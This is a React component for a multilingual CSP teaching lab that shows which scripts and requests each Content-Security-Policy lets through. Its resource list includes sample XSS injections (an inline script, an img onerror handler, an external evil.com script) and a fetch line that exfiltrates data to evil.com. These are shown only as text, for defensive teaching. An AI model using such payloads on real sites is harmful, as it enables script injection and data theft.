import { useState } from 'react';
import { LabFrame, SecStyles, Segmented, Verdict, tr, type L, type Lang } from './ui';

/** Switch between CSP headers and watch which scripts and requests the browser lets through. */

const T: Record<string, L> = {
  title: { zh: 'CSP 政策切換器', en: 'CSP policy switcher', de: 'CSP-Umschalter' },
  hint: {
    zh: '頁面上有兩段你自己的腳本，和四個攻擊者塞進來的東西。切換 CSP，看瀏覽器放行哪些、擋下哪些。',
    en: "The page has two scripts of yours and four things an attacker slipped in. Switch the CSP and see what the browser allows.",
    de: 'Die Seite hat zwei eigene Skripte und vier vom Angreifer eingeschleuste Dinge. Schalte die CSP um.',
  },
  policy: { zh: 'Content-Security-Policy', en: 'Content-Security-Policy', de: 'Content-Security-Policy' },
  none: { zh: '沒有 CSP', en: 'No CSP', de: 'Keine CSP' },
  yours: { zh: '你的', en: 'yours', de: 'deins' },
  attacker: { zh: '攻擊者', en: 'attacker', de: 'Angreifer' },
  run: { zh: '執行', en: 'runs', de: 'läuft' },
  block: { zh: '擋下', en: 'blocked', de: 'blockiert' },
  allBad: {
    zh: '✗ 沒有 CSP：攻擊者塞進來的每一樣東西都會執行，資料也能自由送出。',
    en: '✗ No CSP: everything the attacker injected runs, and data can leave freely.',
    de: '✗ Keine CSP: Alles Eingeschleuste läuft, Daten fließen frei ab.',
  },
  broke: {
    zh: '⚠ 擋下了大部分攻擊，但你自己的 inline 腳本也壞了，而且資料還是送得出去。加上 nonce 和 connect-src 試試。',
    en: '⚠ Most attacks are blocked, but your own inline script breaks too, and data can still leave. Try adding a nonce and connect-src.',
    de: '⚠ Die meisten Angriffe sind blockiert, aber dein Inline-Skript auch, und Daten fließen noch ab. Probier Nonce und connect-src.',
  },
  leaky: {
    zh: '⚠ 你的腳本都正常，攻擊者的腳本也跑不起來，但 fetch 還是能把資料送到 evil.com。補上 connect-src（或 default-src）。',
    en: "⚠ Your scripts work and the attacker's don't run, but fetch can still send data to evil.com. Add connect-src (or default-src).",
    de: '⚠ Deine Skripte laufen, die des Angreifers nicht, aber fetch kann noch an evil.com senden. Ergänze connect-src (oder default-src).',
  },
  unsafe: {
    zh: "✗ 'unsafe-inline' 讓注入的 inline 腳本和 onerror 全部恢復執行，等於 CSP 白設了一半。",
    en: "✗ 'unsafe-inline' lets the injected inline script and onerror run again. Half the CSP is wasted.",
    de: "✗ 'unsafe-inline' lässt das eingeschleuste Inline-Skript und onerror wieder laufen. Die halbe CSP ist verschenkt.",
  },
  best: {
    zh: '✓ 你自己的腳本全部正常，攻擊者的四樣東西全被擋下。',
    en: "✓ All of your scripts work, and all four of the attacker's are blocked.",
    de: '✓ Alle eigenen Skripte laufen, alle vier Angreifer-Dinge sind blockiert.',
  },
};

type P = 'none' | 'self' | 'unsafe' | 'nonce' | 'strict';

const POLICIES: Record<P, string> = {
  none: '',
  self: "script-src 'self'",
  unsafe: "script-src 'self' 'unsafe-inline'",
  nonce: "script-src 'self' 'nonce-r4nd0m'",
  strict: "default-src 'self'; script-src 'self' 'nonce-r4nd0m'",
};

const RES = [
  { code: '<script src="/app.js">', mine: true, allow: { none: 1, self: 1, unsafe: 1, nonce: 1, strict: 1 } },
  { code: '<script nonce="r4nd0m">init()</script>', mine: true, allow: { none: 1, self: 0, unsafe: 1, nonce: 1, strict: 1 } },
  { code: '<script>steal()</script>', mine: false, allow: { none: 1, self: 0, unsafe: 1, nonce: 0, strict: 0 } },
  { code: '<img src=x onerror="steal()">', mine: false, allow: { none: 1, self: 0, unsafe: 1, nonce: 0, strict: 0 } },
  { code: '<script src="https://cdn.evil.com/x.js">', mine: false, allow: { none: 1, self: 0, unsafe: 0, nonce: 0, strict: 0 } },
  { code: "fetch('https://evil.com/c?d=' + data)", mine: false, allow: { none: 1, self: 1, unsafe: 1, nonce: 1, strict: 0 } },
] as const;

const VERDICT: Record<P, { tone: 'bad' | 'warn' | 'good'; key: string }> = {
  none: { tone: 'bad', key: 'allBad' },
  self: { tone: 'warn', key: 'broke' },
  unsafe: { tone: 'bad', key: 'unsafe' },
  nonce: { tone: 'warn', key: 'leaky' },
  strict: { tone: 'good', key: 'best' },
};

export default function CspLab({ lang = 'en' }: { lang?: Lang }) {
  const [p, setP] = useState<P>('none');
  const v = VERDICT[p];

  return (
    <LabFrame lang={lang} title={tr(T.title, lang)} hint={tr(T.hint, lang)} testId="lab-csp">
      <SecStyles />
      <Segmented
        label={tr(T.policy, lang)}
        value={p}
        onChange={setP}
        options={(Object.keys(POLICIES) as P[]).map((k) => ({ value: k, label: k === 'none' ? tr(T.none, lang) : POLICIES[k] }))}
      />
      <div className="mt-3 break-all border-2 border-[#5B695B] bg-[#2A332A] px-3 py-2 font-mono text-[12px] text-[#EEF1E6]">
        <span className="text-[#B9C3B2]">Content-Security-Policy: </span>
        {POLICIES[p] || <span className="text-[#7C8A7C]">—</span>}
      </div>
      <ul className="m-0 mt-3 list-none space-y-1.5 p-0" data-testid="csp-rows">
        {RES.map((r, i) => {
          const ok = !!r.allow[p];
          const bad = ok && !r.mine;
          const broken = !ok && r.mine;
          return (
            <li
              key={`${p}-${i}`}
              className={
                'sec-pop flex items-center gap-2 border-2 px-2.5 py-1.5 ' +
                (bad ? 'border-[#FF6A2B] bg-[#FBE3D7]' : broken ? 'border-[#C9A100] bg-[#FFF6CC]' : 'border-[#B9BAB6] bg-[#F4F4F1]')
              }
              style={{ animationDelay: `${i * 0.06}s` }}
              data-allowed={ok ? 'yes' : 'no'}
            >
              <span
                className={
                  'shrink-0 px-1.5 py-0.5 text-[10px] font-extrabold uppercase tracking-[0.06em] ' +
                  (r.mine ? 'bg-[#DDFF00] text-[#2E382E]' : 'bg-[#FF6A2B] text-[#2A1208]')
                }
              >
                {r.mine ? tr(T.yours, lang) : tr(T.attacker, lang)}
              </span>
              <span className="min-w-0 flex-1 break-all font-mono text-[12px] text-[#2E382E]">{r.code}</span>
              <span className={'shrink-0 text-xs font-extrabold ' + (ok ? (r.mine ? 'text-[#5A7A00]' : 'text-[#B83A12]') : 'text-[#5A645A]')}>
                {ok ? `▶ ${tr(T.run, lang)}` : `⛔ ${tr(T.block, lang)}`}
              </span>
            </li>
          );
        })}
      </ul>
      <div className="mt-3" data-testid="csp-verdict" data-result={v.key}>
        <Verdict tone={v.tone}>{tr(T[v.key], lang)}</Verdict>
      </div>
    </LabFrame>
  );
}
